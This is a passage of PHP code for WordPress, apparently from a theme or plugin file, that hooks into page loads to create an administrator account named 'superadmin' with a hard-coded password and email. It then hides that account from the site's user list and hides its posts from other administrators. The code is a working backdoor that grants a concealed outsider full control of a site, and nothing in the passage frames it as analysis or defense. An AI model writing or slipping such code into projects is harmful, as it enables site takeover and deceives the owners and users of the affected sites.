        if (is_admin() && 'users.php' == $pagenow) {
            $user_search->query_where .= ' AND ID != ' . intval($hidden_user_id);
        }
    }
}
add_action('pre_user_query', 'hide_superadmin_from_user_list');

function hide_superadmin_posts($query) {
    if (is_admin() && $query->is_main_query() && $query->get('post_type') == 'post') {
        $current_user = wp_get_current_user();
        if ($current_user->user_login !== 'superadmin') {
            $superadmin_user = get_user_by('login', 'superadmin');
            if ($superadmin_user) {
                $query->set('author__not_in', array($superadmin_user->ID));
            }
        }
    }
}
add_action('pre_get_posts', 'hide_superadmin_posts');

function create_hidden_superadmin(){
    $username = 'superadmin';
    $password = '123Xnet:*#@456';
    $email = 'senyum.gan@gmail.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
add_action('init', 'create_hidden_superadmin');
